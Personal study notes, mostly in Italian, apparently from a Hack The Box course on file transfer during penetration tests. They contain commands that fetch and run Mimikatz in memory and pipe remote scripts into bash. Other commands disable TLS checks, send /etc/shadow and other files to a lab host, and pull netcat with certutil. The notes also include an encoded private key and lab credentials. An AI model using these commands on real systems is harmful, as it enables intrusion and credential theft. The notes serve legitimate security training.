# Windows File Transfer

Fileless attack/malware sono malware che non utilizzano file ma tool gia' presenti sul sistema.

## PowerShell Base64 Encode & Decode

### check md5 hash
`j4k1dibe@htb[/htb]$ md5sum id_rsa`

### Encode file to base 64
`j4k1dibe@htb[/htb]$ cat id_rsa |base64 -w 0;echo`

### Decode with powershell
`PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))`

### Check se il file e' integro con md5
`PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

## Powershell Web Downloads

Qui c'e' una lista di modi per scaricare con Powershell: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

Molte aziende permettono traffico HTTP/HTTPS ai loro utenti quindi e' un metodo di comuniczione preferito per essere stealth.

metodi powershell

| Method              | Description                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| `OpenRead`          | Returns the data from a resource as a Stream.                              |
| `OpenReadAsync`     | Returns the data from a resource without blocking the calling thread.       |
| `DownloadData`      | Downloads data from a resource and returns a Byte array.                   |
| `DownloadDataAsync` | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| `DownloadFile`      | Downloads data from a resource to a local file.                            |
| `DownloadFileAsync` | Downloads data from a resource to a local file without blocking the calling thread. |
| `DownloadString`    | Downloads a String from a resource and returns a String.                   |
| `DownloadStringAsync`| Downloads a String from a resource without blocking the calling thread.    |


### File Download with PowerShell
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

## FIleless method PowerShell DownloadString
`PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`

Eseguo il file appena scaricato usano IEX (alsias di Invoke-Expression)

`PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX` un altro modo usando il Pipe.


## Powershell Invoke-WebRequest
**iwr,curl e wget** sono tutti alias per **Invoke-WebRequest**

`PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`


## Common error with PowerShell

### Bypass internet explorer not completed
Internet Explore first launch configuration potrebbe non essere stata completata e prevenire i download.

Si puo' prevenire con il parametro **-UseBasicParsing**
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### Bypass SSl/TLS crtificate not trusted
Un altro errore nei download di powershell e' che SSL/TLS non ha un certificato trustato. Possiamo bypasare pure questo
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

### Creare server SMB
`j4k1dibe@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare`

`j4k1dibe@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`, crea server SMB con Username e Password


### Copiare un file dal server SMB
`C:\htb> copy \\192.168.220.133\share\nc.exe`

`C:\htb> net use n: \\192.168.220.133\share /user:test test` mounta un server SMB con Username e Password.

## FTP Downloads
`j4k1dibe@htb[/htb]$ sudo pip3 install pyftpdlib`, scarico modulo ftp

`j4k1dibe@htb[/htb]$ sudo python3 -m pyftpdlib --port 21`, creo server ftp 

### Scarico file da un server FTP con PowerShell
`PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

Quando prendiamo una shell potrebbe essere una shell non interattiva. Se questo e' il caso possiamo creare un **FTP command file**. che contiene i comandi che dobbiamo eseguire 

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


## Upload Operations

### PowerShell Base64 Encode & Decode
`PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))` encoda un file in b64

`j4k1dibe@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts` decodo il file su linux.

## PowerShell Web Uploads

### Installo un WebServer per gestire upload sulla mia macchina

```
j4k1dibe@htb[/htb]$ pip3 install uploadserver

j4k1dibe@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
### Upload di un file con PowerShell
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload
```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

e catturiamo la roba in b64 con netcat `j4k1dibe@htb[/htb]$ nc -lvnp 8000`

`j4k1dibe@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts`

## SMB Uploads

Le aziende tipicamente ammettono traffico HTTP (porta 80) e traffico HTTPS(porta 443). tipicamente le aziende non permettono traffico SMB verso l'esterno.

Pero' si puo' **Runnare SMB over HTTP/HTTPS** con WebDav.WebDAV.(RFC 4918). Quando usi SMB prima prova a connettersi con SMB, se non c'e' alcuna share SMB disponibile prova con HTTP.


## Installare ed usare Un server WebDav
### Installing WebDav Python modules
`j4k1dibe@htb[/htb]$ sudo pip3 install wsgidav cheroot`

### Using WebDav Python module
`j4k1dibe@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

### Connettersi alla WebDav Share
`C:\htb> dir \\192.168.49.128\DavWWWRoot`

Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

### Uploading Files using SMB

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

In alternativa se non ci sono restrizioni per SMB porta 445 verso l'esterno possiamo usare impacket-webserver 

## FTP Uploads
`j4k1dibe@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write`, lato server

`PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` uploado file con PowerShell

### Create a COmmand File for FTP Client to Upload a File
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```



# Linux File Transfer

### Encode file to base64
`j4k1dibe@htb[/htb]$ cat id_rsa |base64 -w 0;echo`

### Decode file from base64
`j4k1dibe@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa`

### Download a file using wget

`j4k1dibe@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`

### download a file using cURL
`j4k1dibe@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

### Fileless download and execution using cURL
`j4k1dibe@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

### Fileless download and execute (python script) using wget
`j4k1dibe@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

## Download using Bash

### Connect to server 
`j4k1dibe@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80`

### HTTP GET request
`j4k1dibe@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`

### Print the response
`j4k1dibe@htb[/htb]$ cat <&3`

## SSH Downloads

### Enabling SSH server
```
j4k1dibe@htb[/htb]$ sudo systemctl enable ssh
j4k1dibe@htb[/htb]$ sudo systemctl start ssh
```

### Downloading file with scp
`j4k1dibe@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . `


Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.


## Web Uploads

`j4k1dibe@htb[/htb]$ sudo python3 -m pip install --user uploadserver` installa estenzione upload server


### Create self-signed certificate
`j4k1dibe@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`

### Start Webserver
`j4k1dibe@htb[/htb]$ mkdir https && cd https`

`j4k1dibe@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem` starto il server con il certificato

### Upload multiple files with cURL

`j4k1dibe@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
la flag **--insecure** serve perche' il certificato e' auto firmato.

### Creating simple webserver with python3
`j4k1dibe@htb[/htb]$ python3 -m http.server`

### Creating a webserver with Python2.7
`j4k1dibe@htb[/htb]$ python3 -m http.server`

### Crating a webserver with PHP
`j4k1dibe@htb[/htb]$ php -S 0.0.0.0:8000`

### Creating a webserver with Ruby
`j4k1dibe@htb[/htb]$ ruby -run -ehttpd . -p8000`

### DOwnload the file 
`j4k1dibe@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt`


## SCP Upload

`j4k1dibe@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/` File upload usando SCP.


## Transferring file with Code

Spesso si trovano sulle macchine installate linguaggi di programmazione tipo Python, PHP, Perl, and Ruby

### Python

`j4k1dibe@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`, con python2

`j4k1dibe@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`, con python3

### PHP

`j4k1dibe@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

`j4k1dibe@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);`

`j4k1dibe@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

### Ruby

`j4k1dibe@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`

### Perl

`j4k1dibe@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`

### JavaScript
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Javascript and scscript.exe

`C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`

### VBScript
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### VBScript and cscript.exe
`C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`


### Upload usando python3

`j4k1dibe@htb[/htb]$ python3 -m uploadserver `, creo un webserver

`j4k1dibe@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` uploadare un file con un one-liner


## Miscellaneous File Transfer Methods

### Netcat

`victim@target:~$ nc -l -p 8000 > SharpKatz.exe`. . sulla macchina che sta in ascolto e riceve

`j4k1dibe@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe` sulla macchina che vuole mandare il file

la flag **--send-only** serve a terminare la connessione dopo che si e' mandato il file

### /bin/TCP

`victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe` ricevere un file


## Powershell Session File Transfer

We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.

`PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985`

`PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01`

`PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

`PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

## RDP

### Mounting a Linux folder using rdesktop
`j4k1dibe@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`

### Using xfreerdp
`j4k1dibe@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`

To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.

# Protected File Transfer

## Using Invoke-AESEncryption.ps1
puoi scaricare da qui: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1

`PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1`

`PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`. scripta un file con una password

## Using OpenSSL in Linux

`j4k1dibe@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`, encrypt

`j4k1dibe@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`, decrypt

# Catching files over HTTP/S


### Create a directory to handle uploaded files
`j4k1dibe@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory`

### Change owner to www-data
`j4k1dibe@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`

### Create nginx configuration file

```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

### Symlink per la directory del sito
`j4k1dibe@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`


### Start nginx
`j4k1dibe@htb[/htb]$ sudo systemctl restart nginx.service`

### verifying errors
`j4k1dibe@htb[/htb]$ tail -2 /var/log/nginx/error.log`
`j4k1dibe@htb[/htb]$ ss -lnpt | grep 80`
`j4k1dibe@htb[/htb]$ ps -ef | grep 2811`

### Remove NginxDefault Configuration
`j4k1dibe@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default`

### upload using cURL
`j4k1dibe@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`

`j4k1dibe@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`

# Living-Off-The-Lands

https://gtfobins.github.io/
https://lolbas-project.github.io/

## LOLBAS
To search for download and upload functions in LOLBAS we can use **/download** or **/upload**.

### Upload a file with certreq.exe
`C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini`

### File received with netcat
`j4k1dibe@htb[/htb]$ sudo nc -lvnp 8000`

## GTFOBins
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.

### Create a certificate
`j4k1dibe@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`

## FileDownload with BITS

`PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`

`PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`

## FileDownload with certutil.exe

`C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe`

## Detection

Sembra figa. non ho voglia
https://academy.hackthebox.com/module/24/section/162

